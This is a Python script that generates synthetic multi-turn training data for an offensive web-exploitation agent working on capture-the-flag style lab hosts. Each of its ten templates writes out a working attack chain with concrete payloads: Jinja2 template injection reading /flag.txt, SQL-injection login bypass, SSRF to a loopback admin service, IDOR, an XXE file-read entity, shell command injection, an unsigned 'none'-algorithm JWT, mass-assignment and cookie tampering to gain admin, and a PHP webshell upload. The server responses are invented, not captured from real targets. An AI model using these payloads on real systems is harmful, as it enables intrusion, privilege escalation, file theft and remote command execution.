"""Teacher-knowledge trajectory generator (pad B / specialist).

"Train the model on your own knowledge": a strong teacher encodes correct, DIVERSE multi-turn
exploit chains across the major web vuln classes, in the exact format qlora_train/grpo_train
consume (SYSTEM + inline-JSON {"reasoning","request","done"} assistant turns + HTTP-RESPONSE
user turns). This BOOTSTRAPS the multi-turn-persistence + chain-structure behaviour the small
model lacks, and balances the harvested real data (which is skewed to a few challenges).

These are SYNTHETIC (the observations are realistic but not from a live target) — they teach
the PATTERN (observe -> probe -> confirm -> exploit -> escalate -> capture), not target-
specific facts. Best mixed with real harvested/generated trajectories. Each template encodes
the CORRECT exploit logic for its class; parameters (host, params, payloads, flag) are
randomised so each emitted trajectory is distinct.
"""
from __future__ import annotations

import argparse
import json
import random
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from scripts.training.make_dataset import J, SYSTEM, obs  # noqa: E402

_HOSTS = ["http://10.0.0.7", "http://app.lab:8000", "http://target.internal", "http://127.0.0.1:5000"]


def _flag() -> str:
    return "flag{" + "".join(random.choice("0123456789abcdef") for _ in range(16)) + "}"


def _u(host: str, path: str) -> str:
    return host.rstrip("/") + path


def _begin(host: str, goal: str) -> list[dict]:
    return [
        {"role": "system", "content": SYSTEM},
        {"role": "user", "content": f"Goal: {goal} on {host}. Begin."},
    ]


# --- one function per vuln class; each returns a complete WINNING trajectory ---

def t_ssti(host: str) -> list[dict]:
    flag = _flag()
    m = _begin(host, "capture the flag")
    m += [{"role": "assistant", "content": J("Map the app first.", "GET", _u(host, "/"))}]
    m += [{"role": "user", "content": obs(200, {"content-type": "text/html"},
          "<form action=/greet method=POST><input name=name></form>")}]
    m += [{"role": "assistant", "content": J("A reflected 'name' field — probe for SSTI with {{7*7}}.",
          "POST", _u(host, "/greet"), {"Content-Type": "application/x-www-form-urlencoded"}, "name=%7B%7B7*7%7D%7D")}]
    m += [{"role": "user", "content": obs(200, {}, "<h1>Hello 49</h1>")}]
    m += [{"role": "assistant", "content": J("49 confirms Jinja2 SSTI. Escalate to RCE and read the flag file.",
          "POST", _u(host, "/greet"), {"Content-Type": "application/x-www-form-urlencoded"},
          "name=%7B%7B+self.__init__.__globals__.__builtins__.open('/flag.txt').read()+%7D%7D")}]
    m += [{"role": "user", "content": obs(200, {}, f"<h1>Hello {flag}</h1>")}]
    m += [{"role": "assistant", "content": J(f"The rendered template leaked {flag}. Goal reached.", done=True)}]
    return m


def t_sqli_authbypass(host: str) -> list[dict]:
    flag = _flag()
    m = _begin(host, "log in as admin and read the flag")
    m += [{"role": "assistant", "content": J("Find the login form.", "GET", _u(host, "/login"))}]
    m += [{"role": "user", "content": obs(200, {}, "<form action=/login method=POST><input name=username><input name=password></form>")}]
    m += [{"role": "assistant", "content": J("Try a classic SQLi auth bypass in username.",
          "POST", _u(host, "/login"), {"Content-Type": "application/x-www-form-urlencoded"},
          "username=admin'--&password=x")}]
    cookie = "session=" + "".join(random.choice("0123456789abcdef") for _ in range(24))
    m += [{"role": "user", "content": obs(302, {"set-cookie": cookie + "; Path=/", "location": "/admin"})}]
    m += [{"role": "assistant", "content": J("302 to /admin with a session cookie — bypass worked. Read /admin (cookie auto-carried).",
          "GET", _u(host, "/admin"))}]
    m += [{"role": "user", "content": obs(200, {}, f"<h1>Admin</h1><p>{flag}</p>")}]
    m += [{"role": "assistant", "content": J(f"Admin panel shows {flag}. Goal reached.", done=True)}]
    return m


def t_ssrf_internal(host: str) -> list[dict]:
    flag = _flag()
    m = _begin(host, "reach the internal-only admin endpoint")
    m += [{"role": "assistant", "content": J("Look for a URL-fetch feature.", "GET", _u(host, "/fetch"))}]
    m += [{"role": "user", "content": obs(200, {}, "<form action=/fetch method=GET><input name=url></form>")}]
    m += [{"role": "assistant", "content": J("A url param — try SSRF to the loopback admin service that is blocked externally.",
          "GET", _u(host, "/fetch?url=http://127.0.0.1:8080/admin"))}]
    m += [{"role": "user", "content": obs(200, {}, "<h1>Internal Admin</h1><a href=/admin/flag>flag</a>")}]
    m += [{"role": "assistant", "content": J("SSRF reaches the internal admin. Follow the internal flag route via SSRF.",
          "GET", _u(host, "/fetch?url=http://127.0.0.1:8080/admin/flag"))}]
    m += [{"role": "user", "content": obs(200, {}, flag)}]
    m += [{"role": "assistant", "content": J(f"The internal endpoint returned {flag}. Goal reached.", done=True)}]
    return m


def t_idor_escalation(host: str) -> list[dict]:
    flag = _flag()
    me, victim = random.randint(1000, 1999), "1"
    m = _begin(host, "read another user's private data")
    m += [{"role": "assistant", "content": J(f"Log in as my own user {me}.", "POST", _u(host, "/login"),
          {"Content-Type": "application/x-www-form-urlencoded"}, f"username=user{me}&password=pw")}]
    cookie = "session=" + "".join(random.choice("0123456789abcdef") for _ in range(20))
    m += [{"role": "user", "content": obs(302, {"set-cookie": cookie + "; Path=/", "location": "/me"})}]
    m += [{"role": "assistant", "content": J(f"Logged in. Read my own object to learn the id scheme.", "GET", _u(host, f"/api/user/{me}"))}]
    m += [{"role": "user", "content": obs(200, {"content-type": "application/json"}, f'{{"id":{me},"notes":"hi"}}')}]
    m += [{"role": "assistant", "content": J(f"IDOR: the id is a path param. Request the admin user id={victim}.", "GET", _u(host, f"/api/user/{victim}"))}]
    m += [{"role": "user", "content": obs(200, {"content-type": "application/json"}, f'{{"id":{victim},"role":"admin","secret":"{flag}"}}')}]
    m += [{"role": "assistant", "content": J(f"IDOR exposed the admin record containing {flag}. Goal reached.", done=True)}]
    return m


def t_xxe(host: str) -> list[dict]:
    flag = _flag()
    m = _begin(host, "read /flag.txt via the XML endpoint")
    m += [{"role": "assistant", "content": J("Probe the XML upload endpoint.", "GET", _u(host, "/upload"))}]
    m += [{"role": "user", "content": obs(200, {}, "POST XML to /parse")}]
    payload = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag.txt">]><r>&x;</r>')
    m += [{"role": "assistant", "content": J("Send an XXE with an external entity reading /flag.txt.",
          "POST", _u(host, "/parse"), {"Content-Type": "application/xml"}, payload)}]
    m += [{"role": "user", "content": obs(200, {}, f"<result>{flag}</result>")}]
    m += [{"role": "assistant", "content": J(f"The external entity expanded to {flag}. Goal reached.", done=True)}]
    return m


def t_cmd_injection(host: str) -> list[dict]:
    flag = _flag()
    m = _begin(host, "achieve command execution and read the flag")
    m += [{"role": "assistant", "content": J("Find the ping/diagnostic tool.", "GET", _u(host, "/ping"))}]
    m += [{"role": "user", "content": obs(200, {}, "<form action=/ping method=GET><input name=host></form>")}]
    m += [{"role": "assistant", "content": J("Inject a shell command after a host with a separator.",
          "GET", _u(host, "/ping?host=127.0.0.1%3Bcat%20/flag.txt"))}]
    m += [{"role": "user", "content": obs(200, {}, f"PING 127.0.0.1 ...\n{flag}")}]
    m += [{"role": "assistant", "content": J(f"Command injection executed; output contains {flag}. Goal reached.", done=True)}]
    return m


def t_jwt_forge(host: str) -> list[dict]:
    flag = _flag()
    m = _begin(host, "forge an admin JWT and read the flag")
    m += [{"role": "assistant", "content": J("Authenticate to obtain a JWT.", "POST", _u(host, "/api/login"),
          {"Content-Type": "application/json"}, '{"user":"guest","pass":"guest"}')}]
    m += [{"role": "user", "content": obs(200, {"content-type": "application/json"},
          '{"token":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.sig"}')}]
    m += [{"role": "assistant", "content": J("Decoded payload is {user:guest,role:user}. Forge role=admin "
          "(weak/none alg) and call the admin route with the forged bearer token.",
          "GET", _u(host, "/api/admin"), {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ."})}]
    m += [{"role": "user", "content": obs(200, {"content-type": "application/json"}, f'{{"flag":"{flag}"}}')}]
    m += [{"role": "assistant", "content": J(f"Forged admin token accepted; response holds {flag}. Goal reached.", done=True)}]
    return m


def t_register_login_admin(host: str) -> list[dict]:
    """The multi-step chain frontier: register -> login -> escalate -> admin -> flag."""
    flag = _flag()
    user = "u" + str(random.randint(1000, 9999))
    m = _begin(host, "gain admin access and read the flag")
    m += [{"role": "assistant", "content": J("No creds given — register a new account first.", "POST", _u(host, "/register"),
          {"Content-Type": "application/x-www-form-urlencoded"}, f"username={user}&password=Pw123!")}]
    m += [{"role": "user", "content": obs(302, {"location": "/login"}, "")}]
    m += [{"role": "assistant", "content": J("Registered. Now log in to obtain a session.", "POST", _u(host, "/login"),
          {"Content-Type": "application/x-www-form-urlencoded"}, f"username={user}&password=Pw123!")}]
    cookie = "session=" + "".join(random.choice("0123456789abcdef") for _ in range(24))
    m += [{"role": "user", "content": obs(302, {"set-cookie": cookie + "; Path=/", "location": "/dashboard"})}]
    m += [{"role": "assistant", "content": J("Logged in (cookie carried). Inspect the profile for a privilege flag.",
          "GET", _u(host, "/profile"))}]
    m += [{"role": "user", "content": obs(200, {}, '<form action=/profile method=POST><input name=is_admin value=0></form>')}]
    m += [{"role": "assistant", "content": J("Mass-assignment: the form exposes is_admin. Set is_admin=1 to self-escalate.",
          "POST", _u(host, "/profile"), {"Content-Type": "application/x-www-form-urlencoded"}, "is_admin=1")}]
    m += [{"role": "user", "content": obs(200, {}, "profile updated")}]
    m += [{"role": "assistant", "content": J("Now authorised — read the admin page.", "GET", _u(host, "/admin"))}]
    m += [{"role": "user", "content": obs(200, {}, f"<h1>Admin</h1>{flag}")}]
    m += [{"role": "assistant", "content": J(f"Self-escalation reached admin; page shows {flag}. Goal reached.", done=True)}]
    return m


def t_cookie_tamper(host: str) -> list[dict]:
    flag = _flag()
    m = _begin(host, "tamper the role cookie to admin and read the flag")
    m += [{"role": "assistant", "content": J("Log in as a normal user.", "POST", _u(host, "/login"),
          {"Content-Type": "application/x-www-form-urlencoded"}, "username=bob&password=bob")}]
    m += [{"role": "user", "content": obs(302, {"set-cookie": "role=user; Path=/", "location": "/home"})}]
    m += [{"role": "assistant", "content": J("The role is stored client-side in a plaintext cookie. Tamper role=admin and hit /admin.",
          "GET", _u(host, "/admin"), {"Cookie": "role=admin"})}]
    m += [{"role": "user", "content": obs(200, {}, f"<h1>Admin</h1><code>{flag}</code>")}]
    m += [{"role": "assistant", "content": J(f"Tampered cookie granted admin; {flag} read. Goal reached.", done=True)}]
    return m


def t_upload_rce(host: str) -> list[dict]:
    flag = _flag()
    m = _begin(host, "upload a webshell and execute it")
    m += [{"role": "assistant", "content": J("Find the upload feature.", "GET", _u(host, "/upload"))}]
    m += [{"role": "user", "content": obs(200, {}, "<form action=/upload method=POST enctype=multipart/form-data><input type=file name=f></form>")}]
    m += [{"role": "assistant", "content": J("Upload a PHP webshell (extension filter looks absent).",
          "POST", _u(host, "/upload"), {"Content-Type": "multipart/form-data; boundary=B"},
          "--B\r\nContent-Disposition: form-data; name=f; filename=s.php\r\n\r\n<?php system($_GET['c']); ?>\r\n--B--")}]
    m += [{"role": "user", "content": obs(200, {}, "saved to /uploads/s.php")}]
    m += [{"role": "assistant", "content": J("Shell uploaded. Execute it to read the flag.",
          "GET", _u(host, "/uploads/s.php?c=cat%20/flag.txt"))}]
    m += [{"role": "user", "content": obs(200, {}, flag)}]
    m += [{"role": "assistant", "content": J(f"Webshell executed; flag {flag} read. Goal reached.", done=True)}]
    return m


_TEMPLATES = [
    t_ssti, t_sqli_authbypass, t_ssrf_internal, t_idor_escalation, t_xxe,
    t_cmd_injection, t_jwt_forge, t_register_login_admin, t_cookie_tamper, t_upload_rce,
]


def generate(per_template: int, seed: int = 2026) -> list[dict]:
    random.seed(seed)
    rows: list[dict] = []
    for tmpl in _TEMPLATES:
        for _ in range(per_template):
            host = random.choice(_HOSTS)
            messages = tmpl(host)
            rows.append({"messages": messages, "meta": {"source": "teacher", "vuln_class": tmpl.__name__[2:]}})
    random.shuffle(rows)
    return rows


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--per-template", type=int, default=12)
    ap.add_argument("--out", default="codex/results/training/teacher_trajectories.jsonl")
    args = ap.parse_args()
    rows = generate(args.per_template)
    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    with out.open("w", encoding="utf-8") as fh:
        for r in rows:
            fh.write(json.dumps(r) + "\n")
    print(json.dumps({"out": str(out), "templates": len(_TEMPLATES),
                      "per_template": args.per_template, "total": len(rows)}, indent=2))


if __name__ == "__main__":
    main()
